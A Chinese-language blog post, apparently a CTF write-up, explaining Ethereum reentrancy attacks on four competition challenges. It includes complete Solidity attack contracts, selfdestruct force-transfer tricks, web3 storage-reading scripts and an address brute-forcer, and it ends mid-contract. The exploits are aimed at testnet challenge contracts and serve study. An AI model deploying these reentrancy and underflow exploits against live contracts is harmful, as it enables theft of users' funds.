@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.11.1","exturl":false,"sidebar":{"position":"right","display":"hide","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="QWB2019 babybank 反编译看一下 profit函数需要level&#x3D;&#x3D;0地址后16位为0xb1b1，调用后level加1，结果为level&#x3D;1，balance加1，结果为balance&#x3D;1 guess函数需要level&#x3D;&#x3D;1和secret&#x3D;&#x3D;arg0，调用后level加1，结果为level&#x3D;2，balance加1，结果为balance&#x3D;2 func_045C函数可以修改secr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="区块链重入攻击练习">
+<meta property="og:url" content="http://example.com/2022/06/28/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB%E7%BB%83%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Lorlike&#39;s Blog">
+<meta property="og:description" content="QWB2019 babybank 反编译看一下 profit函数需要level&#x3D;&#x3D;0地址后16位为0xb1b1，调用后level加1，结果为level&#x3D;1，balance加1，结果为balance&#x3D;1 guess函数需要level&#x3D;&#x3D;1和secret&#x3D;&#x3D;arg0，调用后level加1，结果为level&#x3D;2，balance加1，结果为balance&#x3D;2 func_045C函数可以修改secr">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-06-28T08:46:36.000Z">
+<meta property="article:modified_time" content="2022-06-29T09:26:45.629Z">
+<meta property="article:author" content="Lorlike">
+<meta property="article:tag" content="blockchain">
+<meta property="article:tag" content="reentrancy">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/2022/06/28/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB%E7%BB%83%E4%B9%A0/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2022/06/28/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB%E7%BB%83%E4%B9%A0/","path":"2022/06/28/区块链重入攻击练习/","title":"区块链重入攻击练习"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>区块链重入攻击练习 | Lorlike's Blog</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Lorlike's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#qwb2019-babybank"><span class="nav-number">1.</span> <span class="nav-text">QWB2019 babybank</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%90%88%E7%BA%A6"><span class="nav-number">1.1.</span> <span class="nav-text">攻击合约</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#n1ctf2019-h4ck"><span class="nav-number">2.</span> <span class="nav-text">N1CTF2019 h4ck</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%90%88%E7%BA%A6-1"><span class="nav-number">2.1.</span> <span class="nav-text">攻击合约</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hackergame2019-jcbank"><span class="nav-number">3.</span> <span class="nav-text">Hackergame2019 JCBank</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flag1"><span class="nav-number">3.1.</span> <span class="nav-text">flag1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag2"><span class="nav-number">3.2.</span> <span class="nav-text">flag2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B2020-ownermoney"><span class="nav-number">4.</span> <span class="nav-text">高校战疫网络安全分享赛2020
+OwnerMoney</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%90%88%E7%BA%A6-2"><span class="nav-number">4.1.</span> <span class="nav-text">攻击合约</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Lorlike"
+      src="https://q1.qlogo.cn/g?b=qq&nk=1987356024&s=100">
+  <p class="site-author-name" itemprop="name">Lorlike</p>
+  <div class="site-description" itemprop="description">ctfer/蒟蒻觅马🐶/炼丹</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="tencent://message/?uin=1987356024" title="QQ → tencent:&#x2F;&#x2F;message&#x2F;?uin&#x3D;1987356024" rel="noopener" target="_blank"><i class="fab fa-qq fa-fw"></i>QQ</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://github.com/lorlike" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;lorlike" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/lorlike1" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;lorlike1" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/28/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB%E7%BB%83%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q1.qlogo.cn/g?b=qq&nk=1987356024&s=100">
+      <meta itemprop="name" content="Lorlike">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lorlike's Blog">
+      <meta itemprop="description" content="ctfer/蒟蒻觅马🐶/炼丹">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="区块链重入攻击练习 | Lorlike's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          区块链重入攻击练习
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-06-28 16:46:36" itemprop="dateCreated datePublished" datetime="2022-06-28T16:46:36+08:00">2022-06-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-06-29 17:26:45" itemprop="dateModified" datetime="2022-06-29T17:26:45+08:00">2022-06-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/note/" itemprop="url" rel="index"><span itemprop="name">note</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="qwb2019-babybank">QWB2019 babybank</h2>
+<p><a
+target="_blank" rel="noopener" href="https://ethervm.io/decompile/ropsten/0xd630cb8c3bbfd38d1880b8256ee06d168ee3859c#func_profit">反编译</a>看一下</p>
+<p><strong>profit</strong>函数需要<strong>level==0</strong>地址后<strong>16</strong>位为<strong>0xb1b1</strong>，调用后<strong>level</strong>加<strong>1</strong>，结果为<strong>level=1</strong>，<strong>balance</strong>加<strong>1</strong>，结果为<strong>balance=1</strong></p>
+<p><strong>guess</strong>函数需要<strong>level==1</strong>和<strong>secret==arg0</strong>，调用后<strong>level</strong>加<strong>1</strong>，结果为<strong>level=2</strong>，<strong>balance</strong>加<strong>1</strong>，结果为<strong>balance=2</strong></p>
+<p><strong>func_045C</strong>函数可以修改<strong>secret</strong>，但是要<strong>msg.sender==owner</strong>，但没找到修改<strong>owner</strong>的地方，不能利用</p>
+<p><strong>transfer</strong>函数需要<strong>balance==2</strong>和<strong>arg0==2</strong>，把当前账号的<strong>balance</strong>转到指定地址</p>
+<p><strong>withdraw</strong>函数需要<strong>balance==2</strong>和<strong>arg0==2</strong>，有<strong>call.value</strong>函数可以利用<strong>callback</strong>重入攻击使<strong>balance</strong>下溢</p>
+<p>每个函数前都有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var1 = msg.value;</span><br><span class="line">if (var1) &#123; revert(memory[0x00:0x00]); &#125;</span><br></pre></td></tr></table></figure>
+<p>只能通过销毁其他合约来强制实现转账</p>
+<p><a
+target="_blank" rel="noopener" href="https://vanity-eth.tk/">爆破</a>账号以<strong>0xb1b1</strong>结尾</p>
+<p>对于<strong>secret</strong>，找到合约部署者和合约的修改<strong>secret</strong>的交易，可以找到<strong>secret</strong>的值，或者使用<strong>web3</strong>查找<strong>storage3</strong>的值，该值即为<strong>secret</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> web3</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line">w3=web3.Web3(web3.HTTPProvider(<span class="string">&quot;https://ropsten.infura.io/v3/54828bfa2cb14873a43512fd8d3fc24b&quot;</span>))</span><br><span class="line"></span><br><span class="line">a=w3.eth.get_storage_at(<span class="string">&quot;0xD630cb8c3bbfd38d1880b8256eE06d168EE3859c&quot;</span>,<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(codecs.encode(a,<span class="string">&#x27;hex&#x27;</span>).decode())</span><br><span class="line"><span class="comment"># 0000000000000000000000000000000000000000000000000003fde42988fa35</span></span><br></pre></td></tr></table></figure>
+<p>给创建合约通过销毁合约强制给目标合约转账</p>
+<p>创建攻击合约，用之前的账号给合约转账，再调用合约进行攻击</p>
+<h3 id="攻击合约">攻击合约</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">contract hacker&#123;</span><br><span class="line">    bool status;</span><br><span class="line">    babybank bb=babybank(0xD630cb8c3bbfd38d1880b8256eE06d168EE3859c);</span><br><span class="line"></span><br><span class="line">    function attack()&#123;</span><br><span class="line">        bb.withdraw(2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function()payable &#123;</span><br><span class="line">        if(!status)&#123;</span><br><span class="line">            status=true;</span><br><span class="line">            bb.withdraw(2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function payforflag(string md5ofteamtoken,string b64email)&#123;</span><br><span class="line">        bb.payforflag(md5ofteamtoken,b64email);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract A&#123;</span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    constructor()&#123;</span><br><span class="line">        owner=msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance()payable&#123;&#125;</span><br><span class="line"></span><br><span class="line">    function kill(address to)&#123;</span><br><span class="line">        require(owner==msg.sender);</span><br><span class="line">        selfdestruct(to);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="n1ctf2019-h4ck">N1CTF2019 h4ck</h2>
+<p>**_transfer<strong>是</strong>balanceOf**的转账函数，没有漏洞</p>
+<p><strong>transfer</strong>是**_transfer**外部调用方法</p>
+<p><strong>buy</strong>函数需要<strong>balanceOf==0</strong>，并且需要转入<strong>1wei</strong>，调用成功后调用者的<strong>sellTimes=1</strong>，<strong>balanceOf==1</strong></p>
+<p><strong>sell</strong>需要调用者<strong>balanceOf&gt;=amount</strong>，<strong>sellTimes&gt;0</strong>，且
+<strong>amount&gt;=100</strong>，<strong>call.value</strong>函数可以进行重入攻击，调用一次后<strong>sellTimes</strong>减<strong>1</strong>，重入让其下溢</p>
+<p>首先，转入<strong>200wei</strong>调用<strong>buy</strong>使其<strong>balanceOf==1</strong>，再调用<strong>transfer</strong>把当前的<strong>balanceOf</strong>转到指定账号中，如此循环薅羊毛使指定账号<strong>balanceOf</strong>达到<strong>200</strong></p>
+<p>把<strong>balanceOf</strong>的<strong>200</strong>转到攻击合约，利用<strong>callback</strong>调用两次<strong>sell</strong>使攻击合约的<strong>sellTimes</strong>下溢</p>
+<h3 id="攻击合约-1">攻击合约</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">contract hacker&#123;</span><br><span class="line">    challenge c = challenge(0xE2d6d8808087D2e30EAdF0ACb67708148dbee0C0);</span><br><span class="line">    address wallet=0x3C5D01C380F8D8581bE8E3b5De0a8f35420f7D68;</span><br><span class="line">    bool public status;</span><br><span class="line"></span><br><span class="line">    function attack()payable&#123;</span><br><span class="line">        c.sell(100);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hack1(uint times) payable&#123;</span><br><span class="line">        for(uint i=0;i&lt;times;i++)&#123;</span><br><span class="line">            c.buy.value(1)();</span><br><span class="line">            c.transfer(wallet,1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getValues()payable&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function winnerSubmit()payable&#123;</span><br><span class="line">        c.winnerSubmit();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setStatus()&#123;</span><br><span class="line">        status=!status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function()public payable&#123;</span><br><span class="line">        if(!status)&#123;</span><br><span class="line">            status=!status;</span><br><span class="line">            c.sell(100);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="hackergame2019-jcbank">Hackergame2019 JCBank</h2>
+<h3 id="flag1">flag1</h3>
+<p>直接利用<strong>web3</strong>脚本查看合约的<strong>storage</strong>的<strong>secret</strong>，再调用<strong>get_flag_1</strong>得到第一个<strong>flag</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> web3</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">w3=web3.Web3(web3.HTTPProvider(<span class="string">&quot;https://kovan.infura.io/v3/xxx&quot;</span>))</span><br><span class="line">a=w3.eth.get_storage_at(<span class="string">&quot;0xE575c9abD35Fa94F1949f7d559056bB66FddEB51&quot;</span>,<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(a))</span><br><span class="line"><span class="comment"># 1940577538063170034860903343625652396</span></span><br></pre></td></tr></table></figure>
+<h3 id="flag2">flag2</h3>
+<p>先调用<strong>deposit</strong>函数给目标合约转<strong>1wei</strong></p>
+<p>攻击合约也调用<strong>deposit</strong>给目标合约转<strong>1wei</strong>，此时攻击合约的<strong>balance</strong>为<strong>1</strong></p>
+<p>利用<strong>call.value</strong>的重入攻击调用两次<strong>withdraw</strong>，参数为<strong>1</strong>，因为到达<strong>call.value</strong>函数时，<strong>balance</strong>的值未变动，利用<strong>callback</strong>函数再调用<strong>withdraw</strong>使<strong>balance</strong>向下溢出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">contract hacker&#123;</span><br><span class="line">    address owner;</span><br><span class="line">    bool status;</span><br><span class="line">    uint amount;</span><br><span class="line">    JCBank jcb=JCBank(0xE575c9abD35Fa94F1949f7d559056bB66FddEB51);</span><br><span class="line"></span><br><span class="line">    constructor()payable&#123;</span><br><span class="line">        owner=msg.sender;</span><br><span class="line">        jcb.deposit.value(msg.value)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner&#123;</span><br><span class="line">        require(msg.sender==owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(uint _amount)&#123;</span><br><span class="line">        amount = _amount;</span><br><span class="line">        jcb.withdraw(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_flag_2(uint user_id)public onlyOwner&#123;</span><br><span class="line">        jcb.get_flag_2(user_id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Status()&#123;</span><br><span class="line">        status=!status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function()public payable&#123;</span><br><span class="line">        if(!status)&#123;</span><br><span class="line">            status=!status;</span><br><span class="line">            jcb.withdraw(amount);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2
+id="高校战疫网络安全分享赛2020-ownermoney">高校战疫网络安全分享赛2020
+OwnerMoney</h2>
+<p>先<a
+target="_blank" rel="noopener" href="https://ethervm.io/decompile/ropsten/0x40a590b70790930ceed4d148bf365eea9e8b35f4">反编译</a>合约</p>
+<p><strong>sell</strong>函数调用了<strong>call.value</strong>，需要参数<strong>amount&gt;=200</strong>，<strong>buyTimes&gt;0</strong>，调用者的<strong>balanceOf&gt;=amount</strong>，合约的**balance&gt;=_amount<strong>，调用后buyTimes减</strong>1**</p>
+<p>目标是调用<strong>payforflag</strong>，需要<strong>buyTimes&gt;=200</strong>，那么很明显利用<strong>call.value</strong>重入使<strong>buyTimes</strong>下溢即可完成攻击</p>
+<p><strong>buy</strong>函数可以使<strong>balanceOf=100</strong>，<strong>buyTimes=1</strong>，但需要调用者的地址的后<strong>12</strong>位为<strong>0xfff</strong>，且调用者为合约和需要<strong>1wei</strong></p>
+<p><strong>payforflag</strong>需要<strong>owner==msg.sender</strong>，利用下<strong>change</strong>和<strong>change_Owner</strong>把<strong>owner</strong>改为自己的地址</p>
+<p>我们可以爆破部署第一个合约满足条件的账号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from ethereum import utils</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">def generate_eoa2():</span><br><span class="line">    priv = utils.sha3(os.urandom(4096))</span><br><span class="line">    addr = utils.checksum_encode(utils.privtoaddr(priv))</span><br><span class="line"></span><br><span class="line">    while not utils.decode_addr(utils.mk_contract_address(addr, 0)).endswith(&quot;fff&quot;):</span><br><span class="line">        priv = utils.sha3(os.urandom(4096))</span><br><span class="line">        addr = utils.checksum_encode(utils.privtoaddr(priv))</span><br><span class="line">        </span><br><span class="line">    print(&#x27;Address: &#123;&#125;\nPrivate Key: &#123;&#125;&#x27;.format(addr, priv.hex()))</span><br></pre></td></tr></table></figure>
+<p>参考pikachu师傅的脚本https://hitcxy.com/2020/generate-address/</p>
+<p>爆破出四个账号，把其中三个账号部署的合约的<strong>balanceOf</strong>转账到剩下的账号部署的合约中，就能满足<strong>sell</strong>的条件</p>
+<p>过程中发现目标合约没有<strong>balance</strong>，构造合约自销毁强转一些<strong>balance</strong></p>
+<h3 id="攻击合约-2">攻击合约</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">contract A&#123;</span><br><span class="line">    OwnerMoney om = OwnerMoney(0x40a590b70790930ceed4d148bf365eea9e8b35f4);</span><br><span class="line">    constructor()payable&#123;</span><br><span class="line">        require(msg.value&gt;=1 wei);</span><br><span class="line">    &#125;</span><br><span class="line">    function attack(address to)&#123;</span><br><span class="line">        require(uint(to) &amp; 0xfff == 0xfff);</span><br><span class="line">        bool s = om.buy.value(1 wei)();</span><br><span class="line">        if(s)&#123;</span><br><span class="line">            om.transfer(to,100);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function kill()&#123;</span><br><span class="line">        selfdestruct(0x40a590b70790930ceed4d148bf365eea9e8b35f4);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract hacker&#123;</span><br><span class="line">    OwnerMoney om = OwnerMoney(0x40a590b70790930ceed4d148bf365eea9e8b35f4);</span><br><span class="line">    bool flag=true;</span><br><span class="line">    bool status;</span><br><span class="line">    constructor()payable&#123;</span><br><span class="line">        require(msg.value == 1 wei);</span><br><span class="line">        bool s = om.buy.value(1 wei)();</span><br><span class="line">        require(s==true);</span><br><span class="line">    &#125;</span><br><span 